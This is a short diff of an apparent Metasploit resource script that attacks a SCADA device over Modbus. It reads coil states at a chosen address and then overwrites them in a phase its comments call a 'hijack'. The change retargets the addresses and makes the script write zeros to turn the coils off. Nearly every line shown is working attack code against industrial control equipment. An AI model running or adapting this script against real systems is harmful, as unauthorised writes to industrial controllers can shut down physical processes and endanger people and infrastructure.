@@ -29,19 +29,19 @@ print_status("Phase 2: Reading current coil states...")
 run_single("use auxiliary/scanner/scada/modbusclient")
 run_single("set RHOSTS #{target}")
 run_single("set UNIT_NUMBER 1")
-run_single("set DATA_ADDRESS 0")
-run_single("set NUMBER 10")
+run_single("set DATA_ADDRESS 4100")
+run_single("set NUMBER 5")
 run_single("set ACTION READ_COILS")
 run_single("run")
 
 # -------------------------------------------------------
 # PHASE 3: Write coil states (hijack)
 # Overwrites coil states with attacker-controlled values
-# 1010101010 = alternating on/off across 10 coils
+# 00000 = turn coils off
 # -------------------------------------------------------
 print_status("Phase 3: Writing hijacked coil states...")
 run_single("set ACTION WRITE_COILS")
-run_single("set DATA_COILS 1010101010")
+run_single("set DATA_COILS 00000")
 run_single("run")
 run_single("back")
 
